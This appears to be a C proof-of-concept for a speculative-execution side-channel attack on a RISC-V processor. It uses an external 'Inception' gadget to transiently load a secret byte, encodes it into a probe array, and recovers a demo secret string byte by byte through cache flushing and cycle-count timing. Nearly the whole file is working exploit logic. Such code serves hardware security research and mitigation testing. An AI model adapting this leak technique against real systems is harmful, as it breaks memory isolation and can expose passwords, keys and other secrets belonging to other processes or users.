#include <stdio.h>
#include <stdint.h>
#include "encoding.h"
#include "cache.h"

#define CACHE_HIT_THRESHOLD 50      // Threshold (in cycles) to determine a cache hit
#define ATTACK_SAME_ROUNDS 10       // Number of times to repeat the attack for each byte to increase reliability
#define SECRET_SZ 5                 // The size of the secret string

// Probe array used for the side-channel attack.
// Size is 256 entries (one for each cache line) times the L1 cache block size.
uint8_t array[256 * L1_BLOCK_SZ_BYTES];

// The secret string the attack aims to recover.
char* secretString = "ThisIsTheSecretString";

// External function definition for the "Inception" gadget.
extern void frameDump_Inception(uint64_t depth);

/**
 * @brief Speculative function that uses the Inception gadget to leak information.
 *
 * This function invokes the Inception gadget, which is assumed to cause
 * the processor to speculatively execute instructions beyond the gadget call.
 * The speculatively executed code reads a secret byte and uses it to
 * access the 'array', thereby caching a specific line based on the secret value.
 *
 * @param addr Address of the secret byte to leak.
 */
void specFunc_inception(char *addr) {
    uint64_t dummy = 0;

    // Invoke the Inception gadget, potentially manipulating control flow speculatively.
    // The depth parameter might control how deep the speculation goes or target specific structures.
    frameDump_Inception(2); // Depth 2 is used here, but might be adjustable.

    // ---- Code below might execute speculatively ----
    char secret = *addr; // Speculatively load the secret byte from the given address.
    // Use the secret byte to calculate an index into the probe array.
    // Accessing this address speculatively will bring the corresponding cache line into the L1 cache.
    dummy = array[secret * L1_BLOCK_SZ_BYTES];
    // ---- End of likely speculative execution ----

    dummy = rdcycle(); // Consume dummy value, potentially add delay or barrier.
    (void)dummy; // Avoid unused variable warning
}

int main(void) {
    // Array to store the count of cache hits for each possible cache line
    static uint64_t results[256];
    uint64_t start, diff; // Variables for timing measurements
    uint8_t dummy = 0; // Dummy variable to prevent compiler optimizing out array reads
    char guessedSecret[SECRET_SZ + 1]; // Buffer to store the recovered secret string

    printf("Starting speculative execution attack using Inception gadget...\n");

    // Iterate through each byte of the secret string
    for (uint64_t i = 0; i < SECRET_SZ; i++) {

        // Reset hit counters for all possible byte values (0-255) before attacking the next byte
        for (uint64_t cIdx = 0; cIdx < 256; ++cIdx) {
            results[cIdx] = 0;
        }

        // Repeat the attack multiple times for the same secret byte to improve reliability
        for (uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound) {

            // Flush the probe array from the cache
            flushCache((uint64_t)array, sizeof(array));

            // Call the function that triggers speculative execution and accesses the probe array based on the secret
            specFunc_inception(secretString + i);

            // Restore the frame pointer (fp). This might be necessary if the
            // Inception gadget or subsequent speculative execution corrupted the stack state.
            // It ensures the rest of the main function proceeds correctly.
            __asm__ volatile ("ld fp, -16(sp)");

            // Probe phase: Time the access to each element of the probe array.
            // A cache hit (fast access) indicates speculative access occurred for that index.
            for (uint64_t j = 0; j < 256; ++j) {
                uint8_t* current_addr = &array[j * L1_BLOCK_SZ_BYTES];
                start = rdcycle(); // Read time before access
                dummy &= *current_addr; // Access the array element; use &= to ensure access isn't optimized out
                diff = (rdcycle() - start); // Read time after access and calculate difference

                // If access time is below the threshold, it's likely a cache hit
                if (diff < CACHE_HIT_THRESHOLD) {
                    results[j] += 1; // Increment the hit counter for this cache line
                }
            }
        }

        // Find the byte value (index) with the most cache hits.
        // This is the most likely value for the current secret byte.
        uint64_t max_hits = 0; // Initialize max_hits to 0, was results[0] which could be non-zero from previous runs if not reset properly.
        uint64_t guessed_index = 0; // Index corresponding to max_hits
        for (uint64_t j = 0; j < 256; j++) { // Check all indices 0-255
            if (results[j] > max_hits) {
                max_hits = results[j];
                guessed_index = j;
            }
        }

        // Optional: Print the number of hits for the guessed character
        // Only print if a plausible hit count was found (e.g., > 0)
        if (max_hits > 0) {
             printf("Attacker guessed character '%c' (0x%02lx) for index %lu with %ld hits.\n",
                   (char)guessed_index, guessed_index, i, max_hits);
        } else {
             printf("No reliable character guess for index %lu (no cache hits detected above threshold).\n", i);
             // Assign a placeholder if no guess is reliable
             guessed_index = '?';
        }


        // Store the guessed byte in the result string
        guessedSecret[i] = (char)guessed_index;
    }

    // Null-terminate the reconstructed secret string
    guessedSecret[SECRET_SZ] = '\0';

    // Print the final guessed secret
    printf("\nThe guessed secret is: %s\n", guessedSecret);
    printf("Original secret was: %s\n", secretString);


    return 0;
}